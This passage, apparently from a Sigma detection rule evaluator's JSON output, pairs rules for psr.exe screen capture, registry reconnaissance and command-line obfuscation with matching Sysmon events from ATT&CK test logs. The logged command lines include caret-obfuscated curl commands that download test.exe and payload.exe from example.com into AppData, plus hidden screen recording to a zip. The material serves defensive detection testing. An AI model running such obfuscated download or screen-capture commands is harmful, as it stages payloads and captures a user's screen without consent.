      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E063-6A2E-370D-000000002C00",
      "ParentProcessId": 11508,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E063-6A2E-380D-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46",
      "SystemTime": "2026-06-14T17:09:55.861888Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:09:55.858",
      "Version": 5
    }
  ]
},
{
  "title": "Screen Capture Activity Via Psr.EXE",
  "id": "2158f96f-43c2-43cb-952a-ab4580f32382",
  "description": "Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (Image LIKE '%\\\\Psr.exe' ESCAPE '\\' AND (CommandLine LIKE '%/start%' ESCAPE '\\' OR CommandLine LIKE '%-start%' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.collection",
    "attack.t1113"
  ],
  "count": 3,
  "matches": [
    {
      "row_id": 231,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "psr.exe  /start /output c:\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Steps Recorder",
      "EventID": 1,
      "EventRecordID": 208701,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=08EA62AA46C44428DD93AE6C35658AF9,SHA256=929EE9BDF824148313207996840D3467ACC54CB40A8459AE469C7A17B33883C5,IMPHASH=80B1AA5AEFC9767FEEC2DB70455AA566",
      "IMPHASH": "80B1AA5AEFC9767FEEC2DB70455AA566",
      "Image": "C:\\Windows\\System32\\psr.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "08EA62AA46C44428DD93AE6C35658AF9",
      "Opcode": 0,
      "OriginalFileName": "psr.exe",
      "OriginalLogfile": "t1113__t1113_001.evtx",
      "ParentCommandLine": "cmd.exe /c \"psr.exe /^s^t^a^r^t /output c:\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E417-6A2E-F10F-000000002C00",
      "ParentProcessId": 6360,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E417-6A2E-F20F-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "929EE9BDF824148313207996840D3467ACC54CB40A8459AE469C7A17B33883C5",
      "SystemTime": "2026-06-14T17:25:43.287458Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:25:43.264",
      "Version": 5
    },
    {
      "row_id": 232,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\WINDOWS\\system32\\psr.exe\"  /start /output c:\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Steps Recorder",
      "EventID": 1,
      "EventRecordID": 208704,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=08EA62AA46C44428DD93AE6C35658AF9,SHA256=929EE9BDF824148313207996840D3467ACC54CB40A8459AE469C7A17B33883C5,IMPHASH=80B1AA5AEFC9767FEEC2DB70455AA566",
      "IMPHASH": "80B1AA5AEFC9767FEEC2DB70455AA566",
      "Image": "C:\\Windows\\System32\\psr.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "08EA62AA46C44428DD93AE6C35658AF9",
      "Opcode": 0,
      "OriginalFileName": "psr.exe",
      "OriginalLogfile": "t1113__t1113_001.evtx",
      "ParentCommandLine": "cmd.exe /c \"psr.exe /^s^t^a^r^t /output c:\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E417-6A2E-F10F-000000002C00",
      "ParentProcessId": 6360,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E417-6A2E-F40F-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "929EE9BDF824148313207996840D3467ACC54CB40A8459AE469C7A17B33883C5",
      "SystemTime": "2026-06-14T17:25:43.700538Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:25:43.697",
      "Version": 5
    },
    {
      "row_id": 233,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\WINDOWS\\system32\\psr.exe\"  /start /output c:\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Steps Recorder",
      "EventID": 1,
      "EventRecordID": 208708,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=08EA62AA46C44428DD93AE6C35658AF9,SHA256=929EE9BDF824148313207996840D3467ACC54CB40A8459AE469C7A17B33883C5,IMPHASH=80B1AA5AEFC9767FEEC2DB70455AA566",
      "IMPHASH": "80B1AA5AEFC9767FEEC2DB70455AA566",
      "Image": "C:\\Windows\\System32\\psr.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "08EA62AA46C44428DD93AE6C35658AF9",
      "Opcode": 0,
      "OriginalFileName": "psr.exe",
      "OriginalLogfile": "t1113__t1113_001.evtx",
      "ParentCommandLine": "cmd.exe /c \"psr.exe /^s^t^a^r^t /output c:\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E417-6A2E-F10F-000000002C00",
      "ParentProcessId": 6360,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E417-6A2E-F60F-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "929EE9BDF824148313207996840D3467ACC54CB40A8459AE469C7A17B33883C5",
      "SystemTime": "2026-06-14T17:25:43.917812Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:25:43.908",
      "Version": 5
    }
  ]
},
{
  "title": "Potential Configuration And Service Reconnaissance Via Reg.EXE",
  "id": "970007b7-ce32-49d0-a4a4-fbef016950bd",
  "description": "Detects the usage of \"reg.exe\" in order to query reconnaissance information from the registry. Adversaries may interact with the Windows registry to gather information about credentials, the system, configuration, and installed software.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((Image LIKE '%\\\\reg.exe' ESCAPE '\\' OR OriginalFileName='reg.exe') AND CommandLine LIKE '%query%' ESCAPE '\\' AND (CommandLine LIKE '%currentVersion\\\\windows%' ESCAPE '\\' OR CommandLine LIKE '%winlogon\\\\%' ESCAPE '\\' OR CommandLine LIKE '%currentVersion\\\\shellServiceObjectDelayLoad%' ESCAPE '\\' OR CommandLine LIKE '%currentVersion\\\\run%' ESCAPE '\\' OR CommandLine LIKE '%currentVersion\\\\policies\\\\explorer\\\\run%' ESCAPE '\\' OR CommandLine LIKE '%currentcontrolset\\\\services%' ESCAPE '\\')))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.discovery",
    "attack.t1012",
    "attack.t1007"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 18,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "reg.exe  query HKLM\\System\\CurrentControlSet\\Services",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Registry Console Tool",
      "EventID": 1,
      "EventRecordID": 212800,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=F6E3559DDDDCCC843A12CFD50178C554,SHA256=EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0,IMPHASH=2DC6AE94704E0DBEAFC5A2BB00BD87F0",
      "IMPHASH": "2DC6AE94704E0DBEAFC5A2BB00BD87F0",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "F6E3559DDDDCCC843A12CFD50178C554",
      "Opcode": 0,
      "OriginalFileName": "reg.exe",
      "OriginalLogfile": "t1012__t1012_128.evtx",
      "ParentCommandLine": "cmd.exe /c \"reg.exe q^u^e^r^y HKLM\\System\\CurrentControlSet\\Services\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EE11-6A2E-F117-000000002C00",
      "ParentProcessId": 3140,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EE11-6A2E-F217-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0",
      "SystemTime": "2026-06-14T18:08:17.987416Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:08:17.984",
      "Version": 5
    },
    {
      "row_id": 20,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "reg.exe  query HKLM\\System\\currentcontrolset\\services ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Registry Console Tool",
      "EventID": 1,
      "EventRecordID": 212840,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=F6E3559DDDDCCC843A12CFD50178C554,SHA256=EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0,IMPHASH=2DC6AE94704E0DBEAFC5A2BB00BD87F0",
      "IMPHASH": "2DC6AE94704E0DBEAFC5A2BB00BD87F0",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "F6E3559DDDDCCC843A12CFD50178C554",
      "Opcode": 0,
      "OriginalFileName": "reg.exe",
      "OriginalLogfile": "t1012__t1012_129.evtx",
      "ParentCommandLine": "cmd.exe /c \"set KEY=currentcontrolset\\services && call reg.exe query HKLM\\System\\%KEY%\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EE24-6A2E-0518-000000002C00",
      "ParentProcessId": 5628,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EE24-6A2E-0618-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0",
      "SystemTime": "2026-06-14T18:08:36.066416Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:08:36.058",
      "Version": 5
    }
  ]
},
{
  "title": "Potential Commandline Obfuscation Using Escape Characters",
  "id": "f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd",
  "description": "Detects potential commandline obfuscation using known escape characters",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (CommandLine LIKE '%h^t^t^p%' ESCAPE '\\' OR CommandLine LIKE '%h\"t\"t\"p%' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense-evasion",
    "attack.t1140"
  ],
  "count": 8,
  "matches": [
    {
      "row_id": 98,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl -o %%A^ppData%%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 202920,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_006.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D2EA-6A2E-9C04-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:12:26.453529Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:12:26.411",
      "Version": 5
    },
    {
      "row_id": 100,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl -o %%A^ppData%%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 202958,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_007.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D300-6A2E-AF04-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:12:48.737136Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:12:48.702",
      "Version": 5
    },
    {
      "row_id": 110,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %%AppData%%\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203217,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_015.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D38C-6A2E-3205-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:15:08.106192Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:08.083",
      "Version": 5
    },
    {
      "row_id": 112,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %%AppData%%\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203258,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_016.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3A2-6A2E-4605-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:15:30.704368Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:30.682",
      "Version": 5
    },
